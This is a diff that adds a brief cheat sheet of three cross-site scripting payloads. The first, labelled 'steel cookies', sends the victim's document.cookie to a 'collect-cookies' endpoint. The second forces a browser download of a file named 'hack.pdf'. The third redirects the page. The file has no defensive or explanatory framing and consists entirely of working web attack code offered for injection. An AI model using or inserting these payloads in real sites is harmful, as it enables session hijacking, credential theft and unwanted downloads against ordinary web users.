@@ -1,0 +1,32 @@
+1.steel cookies :
+    <script>
+        fetch("collect-cookies?cookies="+document.cookie)
+        .then(r => r.json())
+        .then(
+            res => {
+                console.log(res)
+            }
+        )
+        .catch(e => console.log(e))
+    </script>
+----------------------------------------------------------------------
+
+2.download:
+    <script>
+        fetch("<file-location>")
+        .then( res => res.blob() )
+        .then( blob => {
+            var url = window.URL.createObjectURL(blob);
+            var a = document.createElement('a');
+            a.href = url;
+            a.setAttribute("download", "hack.pdf");
+            a.click();    
+            a.remove();
+        });
+    </script>
+----------------------------------------------------------------------
+
+3.redirect:
+    <script>window.location='https://www.google.com/'</script>
+
+----------------------------------------------------------------------
